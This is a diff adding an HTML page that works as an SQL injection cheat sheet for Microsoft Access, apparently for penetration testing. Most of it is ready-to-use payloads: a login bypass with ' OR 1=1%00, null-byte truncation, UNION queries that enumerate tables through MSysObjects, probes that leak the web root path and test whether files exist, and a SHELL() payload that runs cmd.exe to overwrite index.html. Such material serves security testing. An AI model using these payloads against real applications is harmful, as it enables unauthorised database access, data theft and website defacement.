@@ -1,0 +1,65 @@
+<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
+<title>Queries</title>
+</head><body>Unfortunately, MS Access doesn't support typical operators that are traditionally used during SQL injection testing, including:<br/>
+No comments characters<br/>
+No stacked queries<br/>
+No LIMIT operator<br/>
+No SLEEP or BENCHMARK alike operators<br/>
+and many other<br/>
+<br/>
+AUTH <br/>
+BYPASS: 	' OR 1=1%00 (or &quot; OR 1=1%00)<br/>
+COMMENT: 	Using a null byte %00 within a SQL query results in MS Access ignoring all remaining characters. <br/>
+			0x16 (%16 in URL encoded format).<br/>
+CONCAT:		String concatenation is possible by using &amp; (%26) and + (%2b) characters.<br/>
+UNION: 		UNION operator is supported, but it needs a valid table name in the FROM clause.<br/>
+SUBQUERY:	example: ' AND (SELECT TOP 1 'someData' FROM validTableName)%00<br/>
+TOP: 		Specify the max results that the query should return from top. example TOP 1 will return only 1 row.<br/>
+MID: 		return extract substring, example the following statement: mid('abc',1,1) returns 'a'<br/>
+LEN: 		len of string passed as param ' UNION SELECT LEN('1234') FROM validTableName%00 returns 4<br/>
+ASC: 		Obtain ASCII value of a char passed as input: ' UNION SELECT ASC('A') FROM ValidTable%00 : <ul><li style="list-style-type: none">		returns 65 (ASCII value for 'A')</li>
+</ul>
+CHR: 		Obtain char of ASCII value passed as input: ' UNION SELECT CHR(65) FROM validTableName%00 <br/>
+			returns 'A'<br/>
+IIF: 			Is the IF construct, for example the following statement IIF(1=1, 'a', 'b') return 'a'<br/>
+LAST: 		This function is used to select only the last row of a set of rows. For example the following query SELECT last(*) FROM users will return only the last row of the result.<br/>
+GROUP:		' GROUP BY Id%00<br/>
+			' GROUP BY ID, SecondAttrName, ...%00<br/>
+			to enumerate all parameters<br/>
+<br/>
+Unfortunately, in the default configuration of recent MS Access database releases, these tables are not accessible. Nevertheless, it is always worth trying:<br/>
+MSysObjects		Fields: Connect, Database, DataCreate, DataUpdate, Flags, ForeignName, Id, Lv, LxExtra<br/>
+				LvModule, LvProp, Name, Owner, ParentId, RmtInfoLong, RmtInfoShort, Type<br/>
+MSysACEs		Fields: ACM, FInheritable, ObjectId, SID<br/>
+MSysAccessXML	Fields: Id, LValue, ObjectGuid, ObjectName, Property, Value<br/>
+MSysQueries<br/>
+MSysRelationships<br/>
+<br/>
+For example, if a union SQL injection vulnerability exists, you can use the following query to get db table names:<br/>
+' UNION SELECT Name FROM MSysObjects WHERE Type = 1%00<br/>
+<br/>
+.mdb file within the application webroot can allow to download the entire database. Database filenames can be inferred with the following query:<br/>
+http://www.example.com/page.app?id=1'+UNION+SELECT+1+FROM+name.table%00<br/>
+<br/>
+where name is the .mdb filename and table is a valid database table<br/>
+<br/>
+<b>Return 0 rows</b>:<br/>
+' AND 1=0 UNION SELECT AttrName1,AttrName2 FROM validTableName%00<br/>
+<b><br/>
+</b><b>Find web root dir:</b> <br/>
+You can find the web root directory trying to select something from an inexistent database. <br/>
+MS Access will response with an error message containing the full path name :<br/>
+' UNION SELECT 1 FROM ThisIsAFakeName.FakeTable%00<br/>
+<br/>
+<b>Verify file existence</b>:<br/>
+' UNION SELECT name FROM msysobjects IN '\boot.ini'%00 : (if file exists) an error message is obtained (it informs that the database format was not recognized).<br/>
+<br/>
+<b>Registry protection</b><br/>
+It's possible to block the use of critical functions (such as SHELL(), etc ...) by setting this register key :<br/>
+\\HKEY_LOCAL_MACHINE\Software\Microsoft\Jet\4.0\engines\SandboxMode<br/>
+Its default value is 2, so by default it's impossible to use these functions: CurDIR() and Shell()<br/>
+<br/>
+CURDIR:		' UNION SELECT CurDir(),1,1 FROM validTableName%00<br/>
+SHELL:		' AND SHELL('cmd.exe /c echo owned &gt; c:\path\name\index.html')%00</body></html>
